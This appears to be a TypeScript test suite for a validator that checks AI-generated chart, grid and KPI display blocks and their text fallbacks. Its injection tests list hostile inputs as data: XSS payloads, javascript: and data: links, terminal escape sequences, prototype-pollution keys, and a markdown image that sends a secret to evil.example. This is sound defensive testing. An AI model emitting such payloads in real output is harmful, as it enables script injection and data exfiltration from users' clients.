import { readFileSync } from "node:fs";
import { describe, expect, test } from "bun:test";
import { inertFallbackText } from "../src/display/fallback";
import {
  checkShowInput,
  noteInputSchema,
  DISPLAY_LIMITS,
  displayEnvelopeSchema,
  displayPath,
  parseDisplayCaps,
  validateBlock,
  type BlockKind,
  type DisplayErrorCode,
} from "../src/index";

type Vectors<K extends string> = {
  valid: Array<{ name: string } & Record<K, unknown>>;
  invalid: Array<{ name: string; code: DisplayErrorCode; path?: string } & Record<K, unknown>>;
};
const load = <K extends string>(name: string) =>
  JSON.parse(readFileSync(new URL(`./fixtures/display/${name}.vectors.json`, import.meta.url), "utf8")) as Vectors<K>;

const rows = (n: number, extra: Record<string, number> = {}) => Array.from({ length: n }, (_, i) => ({ week: `w${i}`, onhand: i, ...extra }));
const line = (values: unknown[], more: Record<string, unknown> = {}) => ({
  vl: { data: { values }, mark: "line", encoding: { x: { field: "week", type: "ordinal" }, y: { field: "onhand", type: "quantitative" } }, ...more },
});
const FALLBACK = "Ridgeline 2P at Columbus runs out on 17 Dec, four days before PO 4471 lands.";
const show = (over: Record<string, unknown> = {}) => ({ block_id: "fig-1", kind: "chart", spec: line(rows(2)), fallback: { text: FALLBACK }, ...over });

for (const kind of ["chart", "grid", "kpis"] as BlockKind[]) {
  describe(`${kind} vectors`, () => {
    const v = load<"spec">(kind);
    for (const c of v.valid) test(`valid: ${c.name}`, () => expect(validateBlock(kind, c.spec)).toMatchObject({ ok: true }));
    for (const c of v.invalid) {
      test(`invalid (${c.code}): ${c.name}`, () => {
        const r = validateBlock(kind, c.spec);
        expect(r.ok ? null : { code: r.error.code, path: r.error.path }).toEqual({ code: c.code, path: c.path });
      });
    }
  });
}

describe("chart allowlist is strict at every depth", () => {
  /** Every plain object of a spec outside its data rows, with its path from `spec` and its depth below `vl`. */
  function objects(spec: unknown): Array<{ path: Array<string | number>; depth: number; obj: Record<string, unknown> }> {
    const out: Array<{ path: Array<string | number>; depth: number; obj: Record<string, unknown> }> = [];
    const stack: Array<{ v: unknown; path: Array<string | number> }> = [{ v: spec, path: [] }];
    while (stack.length) {
      const { v, path } = stack.pop()!;
      if (path.at(-1) === "values" && path.at(-2) === "data") continue;
      if (path[0] === "vl" && (path[1] === "config" || path[1] === "usermeta")) continue; // dropped whole, never drawn
      if (Array.isArray(v)) v.forEach((x, i) => stack.push({ v: x, path: [...path, i] }));
      else if (v && typeof v === "object") {
        if (path[0] === "vl") out.push({ path, depth: path.length, obj: v as Record<string, unknown> });
        for (const [k, x] of Object.entries(v)) stack.push({ v: x, path: [...path, k] });
      }
    }
    return out;
  }
  const rich = load<"spec">("chart").valid.map((c) => c.spec);
  const ridgeline = JSON.parse(readFileSync(new URL("./fixtures/display/golden/ridgeline-2p-projection.json", import.meta.url), "utf8")).show.spec;
  // Names every object inherits, apart from the three refused as reserved anywhere (a different message, same code)
  const BUILTIN_KEYS = Object.getOwnPropertyNames(Object.prototype);
  // a deterministic generator of key names that no allowlist or refusal list names
  let seed = 7;
  const name = () => {
    seed = (seed * 48271) % 2147483647;
    return `zq${seed.toString(36)}`;
  };

  test("an unknown key on any object at depth 1 to 6 is refused at its path", () => {
    let probed = 0;
    const depths = new Set<number>();
    for (const spec of [...rich, ridgeline]) {
      for (const { path, depth } of objects(spec)) {
        if (depth > 6) continue;
        for (let n = 0; n < 3; n++) {
          const key = n === 0 ? name() : BUILTIN_KEYS[(probed + n) % BUILTIN_KEYS.length]!;
          const copy = structuredClone(spec);
          let at: Record<string, unknown> = copy;
          for (const seg of path) at = at[seg as string] as Record<string, unknown>;
          Object.defineProperty(at, key, { value: n === 0 ? 1 : n === 1 ? "x" : { nested: true }, enumerable: true, writable: true, configurable: true });
          const r = validateBlock("chart", copy);
          expect(r.ok ? "ok" : `${r.error.code} ${r.error.path}`).toBe(`VALIDATION_FAILED ${displayPath(["spec", ...path, key])}`);
          probed++;
          depths.add(depth);
        }
      }
    }
    expect([...depths].sort()).toEqual([1, 2, 3, 4, 5, 6]);
    expect(probed).toBeGreaterThan(300);
  });

  test("every valid vector and the golden still pass", () => {
    for (const spec of [...rich, ridgeline]) expect(validateBlock("chart", spec).ok).toBe(true);
  });
});

describe("names every JavaScript object inherits are never rules, and never crash a check (review 2, finding 1)", () => {
  const BUILTINS = Object.getOwnPropertyNames(Object.prototype);
  /** Every plain object of `value` at depth 1..4 (outside chart data rows), as a path. */
  function positions(value: unknown, maxDepth = 4): Array<Array<string | number>> {
    const out: Array<Array<string | number>> = [];
    const stack: Array<{ v: unknown; path: Array<string | number> }> = [{ v: value, path: [] }];
    while (stack.length) {
      const { v, path } = stack.pop()!;
      if (path.at(-1) === "values" && path.at(-2) === "data") continue;
      if (path.length > maxDepth) continue;
      if (Array.isArray(v)) v.forEach((x, i) => stack.push({ v: x, path: [...path, i] }));
      else if (v && typeof v === "object") {
        if (path.length >= 1) out.push(path);
        for (const [k, x] of Object.entries(v)) stack.push({ v: x, path: [...path, k] });
      }
    }
    return out;
  }
  /** A copy of `value` with an own `name` key (even __proto__, as JSON.parse makes it) at `path`. */
  function inject(value: unknown, path: Array<string | number>, name: string, v: unknown): unknown {
    const copy = structuredClone(value) as Record<string | number, unknown>;
    let at = copy;
    for (const seg of path) at = at[seg] as Record<string | number, unknown>;
    Object.defineProperty(at, name, { value: v, enumerable: true, writable: true, configurable: true });
    return copy;
  }
  const never = (run: () => { ok: boolean }) => {
    let r: { ok: boolean } | undefined;
    expect(() => (r = run())).not.toThrow();
    return r!.ok;
  };
  const kpis = { tiles: [{ id: "units", label: "Units short", value: 880, format: "integer", delta: { value: -2, good: "down" } }] };
  const grid = { columns: [{ key: "dc", label: "DC", type: "text" }], rows: [{ dc: "Reno" }], row_key: "dc" };
  const chartSpec = load<"spec">("chart").valid.find((c) => c.name.startsWith("axis, legend, scale"))!.spec;

  for (const [kind, spec] of [["chart", chartSpec], ["kpis", kpis], ["grid", grid]] as const) {
    test(`${kind}: each built-in name, at every object of depth 1 to 4, is refused typed`, () => {
      // the spec itself, then every object below it (kpis and grid nest to depth 3 and 2 at most)
      const at = [[] as Array<string | number>, ...positions(spec)];
      expect(Math.max(...at.map((p) => p.length))).toBe(kind === "chart" ? 4 : kind === "kpis" ? 3 : 2);
      for (const path of at) for (const name of BUILTINS) for (const v of [1, { polluted: 1 }]) expect(never(() => validateBlock(kind as BlockKind, inject(spec, path, name, v)))).toBe(false);
    });
  }

  test("notes and the whole Show input: each built-in name at depth 1 to 4 is refused typed, never thrown", () => {
    const input = show({ notes: [{ id: "n1", kind: "source", text: "ERP", ref: { tool_use_id: "toolu_03" } }], placement: { surface: "canvas" } });
    for (const path of [[] as Array<string | number>, ...positions(input).filter((p) => p[0] !== "spec")]) {
      for (const name of BUILTINS) expect(never(() => checkShowInput(inject(input, path, name, { x: 1 })))).toBe(false);
    }
    for (const name of BUILTINS) expect(noteInputSchema.safeParse(inject({ id: "n1", kind: "source", text: "ERP" }, [], name, 1)).success).toBe(false);
  });

  test("the envelope schema: each built-in name at depth 1 to 4 is refused, never thrown", () => {
    const envelope = JSON.parse(readFileSync(new URL("./fixtures/display/golden/stock-by-dc.json", import.meta.url), "utf8")).envelope;
    for (const path of [[] as Array<string | number>, ...positions(envelope)]) {
      for (const name of BUILTINS) {
        let ok = true;
        expect(() => (ok = displayEnvelopeSchema.safeParse(inject(envelope, path, name, { x: 1 })).success)).not.toThrow();
        if (!(path[0] === "spec" && path.length >= 3 && path[1] === "rows")) expect(ok).toBe(false);
      }
    }
  });

  test("a JSON-parsed __proto__ in a mark, a scale, a title and a transform: typed, with the path", () => {
    const base = JSON.stringify(line(rows(2)).vl).slice(1, -1);
    const cases: Array<[string, string]> = [
      [`{"vl":{${base.replace('"mark":"line"', '"mark":{"type":"line","__proto__":{"polluted":1}}')}}}`, "spec.vl.mark.__proto__"],
      [`{"vl":{${base.replace('"type":"quantitative"', '"type":"quantitative","scale":{"zero":true,"__proto__":{"x":1}}')}}}`, "spec.vl.encoding.y.scale.__proto__"],
      [`{"vl":{${base},"title":{"text":"Stock","__proto__":{"x":1}}}}`, "spec.vl.title.__proto__"],
      [`{"vl":{${base},"transform":[{"__proto__":{"x":1}}]}}`, "spec.vl.transform[0].__proto__"],
      [`{"vl":{${base.replace('"values":[{', '"values":[{"constructor":1,')}}}`, "spec.vl.data.values[0].constructor"],
    ];
    for (const [json, path] of cases) {
      const spec = JSON.parse(json);
      const r = validateBlock("chart", spec);
      expect(r.ok ? "ok" : `${r.error.code} ${r.error.path}`).toBe(`VALIDATION_FAILED ${path}`);
      const s = checkShowInput(show({ spec }));
      expect(s.ok ? null : [s.error.code, s.block_id, s.fallback]).toEqual(["VALIDATION_FAILED", "fig-1", FALLBACK]);
    }
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
  });

  test("the review's accepted cases are refused", () => {
    const enc = (e: Record<string, unknown>) => line(rows(2), { encoding: { x: { field: "week", type: "ordinal" }, y: { field: "onhand", type: "quantitative" }, ...e } });
    const fault = (spec: unknown) => {
      const r = validateBlock("chart", spec);
      return r.ok ? "ok" : `${r.error.code} ${r.error.path}`;
    };
    expect(fault(enc({ x: { field: "week", constructor: { anything: [1, 2] } } }))).toBe("VALIDATION_FAILED spec.vl.encoding.x.constructor");
    expect(fault(enc({ constructor: { field: "onhand" } }))).toBe("VALIDATION_FAILED spec.vl.encoding.constructor");
    expect(fault(line(rows(2), { transform: [{ toString: { a: 1 } }] }))).toBe("VALIDATION_FAILED spec.vl.transform[0]");
    expect(fault(line(rows(2), { transform: [{ valueOf: 1 }] }))).toBe("VALIDATION_FAILED spec.vl.transform[0]");
    expect(fault(enc({ x: { field: "week", type: "ordinal", axis: { hasOwnProperty: "x" } } }))).toBe("VALIDATION_FAILED spec.vl.encoding.x.axis.hasOwnProperty");
  });

  test("an exception inside a check becomes VALIDATION_INTERNAL, with the id and the fallback, never a throw", () => {
    const hostile = show({ spec: line(rows(2)) });
    Object.defineProperty(hostile.spec.vl, "mark", { get: () => { throw new TypeError("boom: secret input"); }, enumerable: true });
    const r = checkShowInput(hostile);
    expect(r.ok ? null : [r.error.code, r.block_id, r.fallback]).toEqual(["VALIDATION_INTERNAL", "fig-1", FALLBACK]);
    expect(r.ok ? "" : r.error.message).not.toContain("secret");
    const v = validateBlock("chart", hostile.spec);
    expect(v.ok ? null : v.error.code).toBe("VALIDATION_INTERNAL");
  });
});

describe("chart limits", () => {
  const code = (spec: unknown) => {
    const r = validateBlock("chart", spec);
    return r.ok ? "ok" : `${r.error.code} ${r.error.path}`;
  };

  test("5,000 inline rows pass, 5,001 are ROWS_OVER_LIMIT", () => {
    expect(code(line(rows(DISPLAY_LIMITS.chartRows)))).toBe("ok");
    expect(code(line(rows(DISPLAY_LIMITS.chartRows + 1)))).toBe("ROWS_OVER_LIMIT spec.vl");
  });

  test("a fold multiplies the rows it is applied to", () => {
    const folded = (n: number) => ({ vl: { ...line(rows(n, { a: 1, b: 2 })).vl, transform: [{ fold: ["onhand", "a", "b"] }] } });
    expect(code(folded(1_666))).toBe("ok");
    expect(code(folded(1_667))).toBe("ROWS_OVER_LIMIT spec.vl");
  });

  test("over 50,000 cells is ROWS_OVER_LIMIT even under the row limit", () => {
    const wide = Object.fromEntries(Array.from({ length: 11 }, (_, i) => [`f${i}`, i]));
    expect(code(line(rows(4_000, wide)))).toBe("ROWS_OVER_LIMIT spec.vl");
    expect(code(line(rows(3_500, wide)))).toBe("ok");
  });

  test("12 series pass, 13 are refused at the colour field", () => {
    const series = (n: number) => line(Array.from({ length: n }, (_, i) => ({ week: "w", onhand: i, sku: `s${i}` })), {
      encoding: { x: { field: "week", type: "ordinal" }, y: { field: "onhand", type: "quantitative" }, color: { field: "sku", type: "nominal" } },
    });
    expect(code(series(12))).toBe("ok");
    expect(code(series(13))).toBe("VALIDATION_FAILED spec.vl.encoding.color.field");
  });

  test("the drawn spec loses the top-level $schema, config and usermeta and keeps everything else", () => {
    const spec = line(rows(2), { $schema: "https://vega.github.io/schema/vega-lite/v6.json", config: { view: { stroke: null } }, usermeta: { x: 1 }, title: "Stock" });
    const r = validateBlock("chart", { ...spec, series_order: ["onhand"] });
    expect(r).toEqual({ ok: true, value: { vl: { ...line(rows(2)).vl, title: "Stock" }, series_order: ["onhand"] } });
  });

  test("the input spec is not mutated by stripping", () => {
    const spec = line(rows(1), { config: {} });
    validateBlock("chart", spec);
    expect("config" in spec.vl).toBe(true);
  });
});

describe("input bounds: depth and size are checked without recursion, before any walk", () => {
  /** An empty array wrapped in `n` more, built without recursion: n + 1 levels. */
  const nested = (n: number): unknown[] => {
    let v: unknown[] = [];
    for (let i = 0; i < n; i++) v = [v];
    return v;
  };
  const deepChart = (n: number) => line(rows(2), { encoding: { x: { field: "week", type: "ordinal", axis: { values: nested(n) } }, y: { field: "onhand", type: "quantitative" } } });
  const fault = (r: { ok: boolean; error?: { code: string; path?: string } }) => (r.ok ? "ok" : `${r.error!.code} ${r.error!.path ?? ""}`);

  test("12,000 and 100,000 deep: SPEC_TOO_LARGE at the first value past 32, never a thrown RangeError", () => {
    for (const n of [12_000, 100_000]) {
      const r = validateBlock("chart", deepChart(n));
      expect(r.ok ? "ok" : r.error.code).toBe("SPEC_TOO_LARGE");
      expect(r.ok ? "" : r.error.path).toBe(`spec.vl.encoding.x.axis.values${"[0]".repeat(DISPLAY_LIMITS.inputDepth - 4)}`);
      const s = checkShowInput(show({ spec: deepChart(n) }));
      expect(s.ok ? null : [s.error.code, s.block_id, s.fallback]).toEqual(["SPEC_TOO_LARGE", "fig-1", FALLBACK]);
    }
  });

  test("a value at depth 32 is within bounds", () => {
    // spec(0) vl(1) encoding(2) x(3) axis(4) values(5): 27 arrays inside it reach 32
    const r = validateBlock("chart", deepChart(DISPLAY_LIMITS.inputDepth - 5));
    expect(r.ok ? "ok" : r.error.code).not.toBe("SPEC_TOO_LARGE");
    expect(fault(validateBlock("chart", deepChart(DISPLAY_LIMITS.inputDepth - 4)))).toMatch(/^SPEC_TOO_LARGE /);
  });

  test("a wide input at the node limit is not refused for size; one value more is", () => {
    // spec, vl, data, values: 4 values, then the elements
    const wide = (n: number) => ({ vl: { data: { values: Array.from({ length: n }, () => 0) } } });
    expect(fault(validateBlock("chart", wide(DISPLAY_LIMITS.inputNodes - 4)))).not.toMatch(/^SPEC_TOO_LARGE/);
    expect(fault(validateBlock("chart", wide(DISPLAY_LIMITS.inputNodes - 3)))).toBe("SPEC_TOO_LARGE spec");
    const s = checkShowInput(show({ spec: wide(DISPLAY_LIMITS.inputNodes) }));
    expect(s.ok ? null : [s.error.code, s.fallback]).toEqual(["SPEC_TOO_LARGE", FALLBACK]);
  });
});

describe("grid limits", () => {
  test("2,000 inline rows pass, 2,001 are ROWS_OVER_LIMIT", () => {
    const grid = (n: number) => ({ columns: [{ key: "id", label: "Id", type: "num" }], rows: Array.from({ length: n }, (_, i) => ({ id: i })), row_key: "id" });
    expect(validateBlock("grid", grid(DISPLAY_LIMITS.gridRows)).ok).toBe(true);
    const r = validateBlock("grid", grid(DISPLAY_LIMITS.gridRows + 1));
    expect(r.ok ? null : [r.error.code, r.error.path]).toEqual(["ROWS_OVER_LIMIT", "spec.rows"]);
  });
});

describe("fallback vectors (through checkShowInput)", () => {
  const v = load<"fallback" | "kind">("fallback");
  for (const c of v.valid) test(`valid: ${c.name}`, () => expect(checkShowInput(show({ kind: c.kind, fallback: c.fallback })).ok).toBe(true));
  for (const c of v.invalid) {
    test(`invalid (${c.code}): ${c.name}`, () => {
      const r = checkShowInput(show({ kind: c.kind, fallback: c.fallback }));
      expect(r.ok ? null : { code: r.error.code, path: r.error.path }).toEqual({ code: c.code, path: c.path });
    });
  }

  test("the digit rule is for chart, kpis and grid only: an unknown kind is refused for its kind, not its fallback", () => {
    const words = "Stock at Columbus runs out before the purchase order lands, so a transfer is needed.";
    const r = checkShowInput(show({ kind: "flame_graph", fallback: { text: words } }));
    expect(r.ok ? null : r.error.code).toBe("KIND_UNKNOWN");
  });

  test("the text is trimmed; the table is appended under it", () => {
    const r = checkShowInput(show({ fallback: { text: `  ${FALLBACK}\n`, table: { from: "rows" } } }));
    expect(r.ok && r.show.fallback).toBe(`${FALLBACK}\n\n| week | onhand |\n| --- | ---: |\n| w0 | 0 |\n| w1 | 1 |`);
  });

  test("a table says how many rows it left out, and escapes pipes and newlines in cells", () => {
    const values = [{ week: "a|b", onhand: 1 }, { week: "c\nd", onhand: 2 }, { week: "e", onhand: 3 }];
    const r = checkShowInput(show({ spec: line(values), fallback: { text: FALLBACK, table: { from: "rows", max_rows: 2 } } }));
    expect(r.ok && r.show.fallback).toBe(`${FALLBACK}\n\n| week | onhand |\n| --- | ---: |\n| a\\|b | 1 |\n| c d | 2 |\n\n1 more row not shown.`);
  });

  test("a kpis block has no rows to tabulate", () => {
    const kpis = { tiles: [{ id: "units", label: "Units short", value: 880, format: "integer" }] };
    const r = checkShowInput(show({ kind: "kpis", spec: kpis, fallback: { text: FALLBACK, table: { from: "rows" } } }));
    expect(r.ok ? null : [r.error.code, r.error.path]).toEqual(["VALIDATION_FAILED", "fallback.table"]);
  });
});

describe("what the engine writes from block data is inert text in every client (review 1, finding 3)", () => {
  const grid = (cell: string, key = "note") => ({ columns: [{ key: "id", label: "Id", type: "num" }, { key, label: "Note", type: "text" }], rows: [{ id: 1, [key]: cell }], row_key: "id" });
  const tabled = (kind: string, spec: unknown) => checkShowInput(show({ kind, spec, fallback: { text: FALLBACK, table: { from: "rows" } } }));
  const table = (r: ReturnType<typeof checkShowInput>) => (r.ok ? r.show.fallback.slice(FALLBACK.length) : `refused ${r.error.code} ${r.error.path}`);

  test("a grid cell carrying a markdown image to a remote URL cannot become an image or a link", () => {
    const t = table(tabled("grid", grid("![x](https://evil.example/p.png?d=secret)")));
    expect(t).not.toContain("![");
    expect(t).not.toContain("://");
    expect(t).toContain("\\!\\[x\\](https:\\/\\/evil.example/p.png?d=secret)");
  });

  test("a chart datum carrying HTML cannot become markup", () => {
    const spec = line([{ week: "<img src=x onerror=alert(1)>", onhand: 1 }]);
    const t = table(tabled("chart", spec));
    expect(t).not.toMatch(/(^|[^\\])</);
    expect(t).toContain("\\<img src=x onerror=alert(1)\\>");
  });

  test("terminal escapes: refused in the model's fallback text and in any cell, a header included", () => {
    for (const text of [`\u001b]52;c;ZXZpbA==\u0007${FALLBACK}`, `\u001b[2J${FALLBACK}`, `${FALLBACK}\u009b31m`]) {
      const r = checkShowInput(show({ fallback: { text } }));
      expect(r.ok ? null : [r.error.code, r.error.path]).toEqual(["VALIDATION_FAILED", "fallback.text"]);
    }
    expect(table(tabled("grid", grid("red \u001b[31mALERT\u001b[0m")))).toBe("refused VALIDATION_FAILED spec.rows[0].note");
    expect(table(tabled("chart", line([{ week: "w\u001b[2J", onhand: 1 }])))).toBe("refused VALIDATION_FAILED spec.vl.data.values[0].week");
    expect(table(tabled("chart", line([{ week: "w", onhand: 1, "k\u001b[2J": 1 }])))).toBe("refused VALIDATION_FAILED spec.vl.data.values[0]");
  });

  test("markdown-active characters are escaped; autolinks are broken; a long cell is cut at 120 characters", () => {
    const t = table(tabled("grid", grid("*bold* _em_ `code` ~~s~~ #h & <b> www.example.com " + "x".repeat(300))));
    for (const raw of ["*bold*", "_em_", "`code`", "~~s~~", " #h", " & ", "<b>", "www.example"]) expect(t).not.toContain(raw);
    const cell = t.split("\n").at(-1)!.split(" | ")[1]!.replace(/ \|$/, "");
    expect([...cell.replace(/\\(.)/g, "$1")].length).toBeLessThanOrEqual(120);
    expect(cell.endsWith("…")).toBe(true);
  });

  test("a refusal's message quotes the model's names inertly", () => {
    const r = checkShowInput(show({ kind: "grid", spec: { ...grid("x"), rows: [{ id: 1, "![x](https://e.example/p.png)": "y" }] } }));
    expect(r.ok ? null : r.error.code).toBe("VALIDATION_FAILED");
    const said = r.ok ? "" : `${r.error.message} ${r.error.hint ?? ""}`;
    expect(said).not.toContain("![");
    expect(said).not.toContain("://");
  });
});

describe("the model's fallback is never HTML, an image or a dangerous link, by check and by construction (review 2, finding 2)", () => {
  const refused = [
    // the review's
    "<img/src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<details/open/ontoggle=alert(1)>",
    "![chart][1]\n\n[1]: https://evil.example/p.png?d=secret",
    // ours
    "<!-- hidden -->",
    "<![CDATA[x]]>",
    "<?php echo 1 ?>",
    "</p>",
    "<a\nhref=x>link</a>",
    "![chart]\n\n[chart]: https://evil.example/p.png",
    "![chart] [1]",
    "[details](javascript:alert(1))",
    "[details](JaVaScRiPt:alert(1))",
    "[details]( data:text/html;base64,PHNjcmlwdD4=)",
    "[details](&#106;avascript:alert(1))",
    "[details](vbscript:msgbox(1))",
    "\n\n[ref]: javascript:alert(1)",
    "<javascript:alert(1)>",
    "<https://evil.example/autolink>",
  ];
  for (const payload of refused) {
    test(`refused: ${JSON.stringify(payload)}`, () => {
      const r = checkShowInput(show({ fallback: { text: `${FALLBACK} ${payload}` } }));
      expect(r.ok ? null : [r.error.code, r.error.path]).toEqual(["VALIDATION_FAILED", "fallback.text"]);
    });
  }

  test("allowed: http(s) and relative links, and a comparison; stored with every < as an entity", () => {
    const text = `${FALLBACK} See [the report](https://example.com/r) and [PO 4471](po/4471). Stock 3 < 5 and 7 > 2.`;
    const r = checkShowInput(show({ fallback: { text } }));
    expect(r.ok && r.show.fallback).toBe(text.replace("3 < 5", "3 &lt; 5"));
  });

  test("by construction: whatever the checks become, the stored text cannot open a tag, show an image or link to another scheme", () => {
    for (const payload of refused) {
      const out = inertFallbackText(payload);
      expect(out).not.toContain("<");
      expect(out).not.toContain("![");
      expect(out).not.toMatch(/\]\(\s*(?!https?:\/\/)[^)\s]*[:&]/i);
      expect(out).not.toMatch(/^ {0,3}\[[^\]]+\]:\s*(?!https?:\/\/)\S*[:&]/im);
    }
    expect(inertFallbackText("[ok](https://example.com) [rel](po/1)")).toBe("[ok](https://example.com) [rel](po/1)");
  });
});

describe("checkShowInput", () => {
  const fault = (raw: unknown, opts?: Parameters<typeof checkShowInput>[1]) => {
    const r = checkShowInput(raw, opts);
    return r.ok ? null : { code: r.error.code, path: r.error.path, block_id: r.block_id, fallback: r.fallback };
  };

  test("a valid input comes back with its spec as drawn, its fallback complete and no absent optional keys", () => {
    const r = checkShowInput(show({ title: "Projected stock", placement: { surface: "canvas", slot: "projection" } }));
    expect(r).toEqual({
      ok: true,
      show: { block_id: "fig-1", kind: "chart", spec: line(rows(2)), fallback: FALLBACK, title: "Projected stock", placement: { surface: "canvas", slot: "projection" } },
    });
  });

  test("not an object", () => {
    for (const x of [null, "show", 3, [show()]]) expect(fault(x)).toEqual({ code: "VALIDATION_FAILED", path: undefined, block_id: undefined, fallback: undefined });
  });

  test("over 256 KiB of JSON is SPEC_TOO_LARGE, after the id and the fallback so the fallback can be shown", () => {
    const big = show({ spec: { vl: { data: { values: [{ blob: "x".repeat(DISPLAY_LIMITS.inputBytes) }] } } } });
    expect(fault(big)).toEqual({ code: "SPEC_TOO_LARGE", path: undefined, block_id: "fig-1", fallback: FALLBACK });
  });

  test("an invalid block_id: no id, so nothing can be shown", () => {
    expect(fault(show({ block_id: "Fig 1" }))).toEqual({ code: "VALIDATION_FAILED", path: "block_id", block_id: undefined, fallback: undefined });
  });

  test("an invalid fallback: the id is known, the fallback is not shown", () => {
    expect(fault(show({ fallback: { text: "See above." } }))).toEqual({ code: "FALLBACK_UNINFORMATIVE", path: "fallback.text", block_id: "fig-1", fallback: undefined });
  });

  test("anything after the fallback fails with the id and the fallback, so the engine can show it", () => {
    expect(fault(show({ spec: line(rows(2), { mark: "image" }) }))).toEqual({ code: "VALIDATION_FAILED", path: "spec.vl.mark", block_id: "fig-1", fallback: FALLBACK });
  });

  test("an approval is the host's", () => {
    expect(fault(show({ kind: "approval" }))?.code).toBe("HOST_OWNED_KIND");
  });

  test("a kind outside the catalog is KIND_UNKNOWN; one the client does not draw is KIND_NOT_ALLOWED", () => {
    expect(fault(show({ kind: "timeline" }))?.code).toBe("KIND_UNKNOWN");
    expect(fault(show(), { kinds: new Set<BlockKind>(["grid"]) })).toMatchObject({ code: "KIND_NOT_ALLOWED", path: "kind" });
    expect(checkShowInput(show(), { kinds: new Set<BlockKind>(["chart"]) }).ok).toBe(true);
  });

  test("the kind is checked before the spec: a client that does not draw charts never asks for a chart repair", () => {
    expect(fault(show({ spec: { vl: {} } }), { kinds: new Set<BlockKind>(["kpis"]) })?.code).toBe("KIND_NOT_ALLOWED");
  });

  test("a missing kind or spec", () => {
    expect(fault(show({ kind: undefined }))).toMatchObject({ code: "VALIDATION_FAILED", path: "kind" });
    expect(fault({ block_id: "fig-1", kind: "chart", fallback: { text: FALLBACK } })).toMatchObject({ code: "VALIDATION_FAILED", path: "spec" });
  });

  test("an unknown field is refused by name, never ignored", () => {
    const r = checkShowInput(show({ level: "block" }));
    expect(r.ok ? null : r.error).toEqual({ code: "VALIDATION_FAILED", message: "unknown field: level" });
  });

  test("placement: thread or canvas; the home arrives with describe-and-add", () => {
    expect(checkShowInput(show({ placement: { surface: "thread", size: "wide" } })).ok).toBe(true);
    expect(fault(show({ placement: { surface: "home" } }))).toMatchObject({ code: "VALIDATION_FAILED", path: "placement.surface" });
  });

  test("notes: source, assumption and caveat from the model; memory and verifier are the engine's", () => {
    const note = { id: "n1", kind: "source", text: "ERP inventory snapshot", ref: { tool_use_id: "toolu_03" }, as_of: "2026-11-27T06:00:00Z", rows: 11 };
    expect(checkShowInput(show({ notes: [note, { id: "n2", kind: "assumption", text: "Forecast v14 holds" }] })).ok).toBe(true);
    expect(fault(show({ notes: [{ ...note, kind: "memory" }] }))).toMatchObject({ code: "VALIDATION_FAILED", path: "notes[0].kind" });
    expect(fault(show({ notes: [{ ...note, text: "a\u0007b" }] }))).toMatchObject({ code: "VALIDATION_FAILED", path: "notes[0].text" });
  });

  test("as_of is an ISO 8601 time; sources are at most 20", () => {
    expect(fault(show({ as_of: "27 Nov" }))).toMatchObject({ code: "VALIDATION_FAILED", path: "as_of" });
    expect(fault(show({ sources: Array.from({ length: 21 }, (_, i) => `t${i}`) }))).toMatchObject({ code: "VALIDATION_FAILED", path: "sources" });
  });
});

describe("display caps vectors", () => {
  const v = load<"caps">("caps");
  for (const c of v.valid) test(`valid: ${c.name}`, () => expect(parseDisplayCaps(c.caps).ok).toBe(true));
  for (const c of v.invalid) {
    test(`invalid (${c.code}): ${c.name}`, () => {
      const r = parseDisplayCaps(c.caps);
      expect(r.ok ? null : { code: r.error.code, path: r.error.path }).toEqual({ code: c.code, path: c.path });
    });
  }

  test("a newer client's level and a2ui version are dropped, the rest kept", () => {
    const caps = v.valid.find((c) => c.name === "a level from a newer client is dropped")!.caps;
    const r = parseDisplayCaps(caps);
    expect(r.ok && r.value.levels).toEqual(["text", "block"]);
    const a2ui = parseDisplayCaps(v.valid.find((c) => c.name === "an a2ui version from a newer client is dropped")!.caps);
    expect(a2ui.ok && a2ui.value.a2ui).toBeUndefined();
  });

  test("a newer client's extra field is dropped, not kept", () => {
    const caps = v.valid.find((c) => c.name === "a field from a newer client")!.caps;
    const r = parseDisplayCaps(caps);
    expect(r.ok && "gestures" in r.value).toBe(false);
  });
});

describe("display envelope schema", () => {
  const block = {
    v: 1,
    block_id: "fig-1",
    revision: 1,
    op: "snapshot",
    level: "block",
    kind: "chart",
    catalog: "harness.v1/1",
    spec: line(rows(1)),
    fallback: { text: FALLBACK },
    source: { by: "model" },
    status: "ok",
  };
  const text = { v: 1, block_id: "fig-1", revision: 2, op: "snapshot", level: "text", fallback: { text: FALLBACK }, source: { by: "model" }, status: "repairing" };

  test("a block and a text envelope parse", () => {
    expect(displayEnvelopeSchema.safeParse(block).success).toBe(true);
    expect(displayEnvelopeSchema.safeParse(text).success).toBe(true);
  });

  test("every envelope has a fallback; a text envelope has no kind or spec; a block's status is ok", () => {
    const { fallback: _, ...noFallback } = block;
    expect(displayEnvelopeSchema.safeParse(noFallback).success).toBe(false);
    expect(displayEnvelopeSchema.safeParse({ ...text, kind: "chart" }).success).toBe(false);
    expect(displayEnvelopeSchema.safeParse({ ...block, status: "repairing" }).success).toBe(false);
    expect(displayEnvelopeSchema.safeParse({ ...block, kind: "timeline" }).success).toBe(false);
  });
});

test("displayPath", () => {
  expect(displayPath(["spec", "vl", "layer", 0, "encoding", "y"])).toBe("spec.vl.layer[0].encoding.y");
  expect(displayPath([0, "a"])).toBe("[0].a");
  expect(displayPath([])).toBe("");
});
